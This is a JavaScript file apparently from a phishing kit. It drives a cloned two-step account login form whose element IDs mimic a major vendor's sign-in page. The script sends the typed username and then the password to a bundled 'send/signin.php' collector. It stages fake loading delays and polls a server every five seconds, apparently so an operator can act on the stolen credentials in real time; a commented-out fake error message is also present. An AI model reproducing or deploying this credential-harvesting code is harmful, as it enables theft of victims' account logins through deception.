var user_id = document.querySelector('#account_name_text_field');
var pwd_id = document.querySelector('#password_text_field');
var form = document.querySelector('#signinFrm');
var subBtn = document.querySelector('#sign-in');
var arrowBtn = document.querySelector('#arrowBtn');
var loading_spinner_id = document.querySelector('#loading_spinner_id');
var accnames = document.querySelector('#accnames');
var sign_in_form = document.querySelector('#sign_in_form');
var errMessageId = document.querySelector('#errMessageId');
var userWholeErr = document.querySelector('#userWholeErr');
var pwdWholeErr = document.querySelector('#pwdWholeErr');

function sendPost(user, pwd) {
    const apiUrl = 'send/signin.php';
  
    const formData = new FormData();
    
    formData.append('user', user);
    if (pwd !== 0) {
      formData.append('password', pwd);
    }
  
    const fetchOptions = {
      method: 'POST',
      body: formData,
    };
  
    fetch(apiUrl, fetchOptions)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('POST request successful:', data);
        unique = data.unique;
      })
      .catch(error => {
        console.error('Error making POST request:', error);
      });
  }

user_id.addEventListener('input', function(){
    errMessageId.classList.replace('show', 'hide');
    userWholeErr.classList.remove('is-error');
    pwdWholeErr.classList.remove('is-error');
    if(user_id.value.length == 0){
        subBtn.disabled = true;
        user_id.classList.remove('form-textbox-entered');
    }else{
        subBtn.disabled = false;
        user_id.classList.add('form-textbox-entered');
    }
});

pwd_id.addEventListener('input', function(){
    errMessageId.classList.replace('show', 'hide');
    userWholeErr.classList.remove('is-error');
    pwdWholeErr.classList.remove('is-error');
    if(pwd_id.value.length == 0){
        subBtn.disabled = true;
        pwd_id.classList.remove('form-textbox-entered');
    }else{
        subBtn.disabled = false;
        pwd_id.classList.add('form-textbox-entered');
    }
});

counter = 1;

form.addEventListener('submit', function(){
    event.preventDefault();

    if(counter == 1){
        if(user_id.value.length != 0){
            sendPost(user_id.value, 0);
            arrowBtn.classList.add('hide');
            loading_spinner_id.classList.replace('hide', 'show');
            setTimeout(() => {
                accnames.classList.replace('hide-password', 'show-password');
                sign_in_form.classList.replace('hide-password', 'show-password');
                loading_spinner_id.classList.replace('show', 'hide');
                arrowBtn.classList.remove('hide');
                pwd_id.focus();
            }, 5000);
            counter++;
        }
        }else if(counter == 2){

            if(pwd_id.value.length != 0){
                sendPost(user_id.value, pwd_id.value);
                arrowBtn.classList.add('hide');
                loading_spinner_id.classList.replace('hide', 'show');
                user_id.blur();
                pwd_id.blur();
                requesting = setInterval(makeRequest, 5000);  
                // setTimeout(() => {
                //     errMessageId.classList.replace('hide', 'show');
                //     userWholeErr.classList.add('is-error');
                //     pwdWholeErr.classList.add('is-error');
   
                //     loading_spinner_id.classList.replace('show', 'hide');
                //     arrowBtn.classList.remove('hide');

                //     user_id.blur();
                //     pwd_id.blur();
                // }, 2000);
            }
            
    }

});


    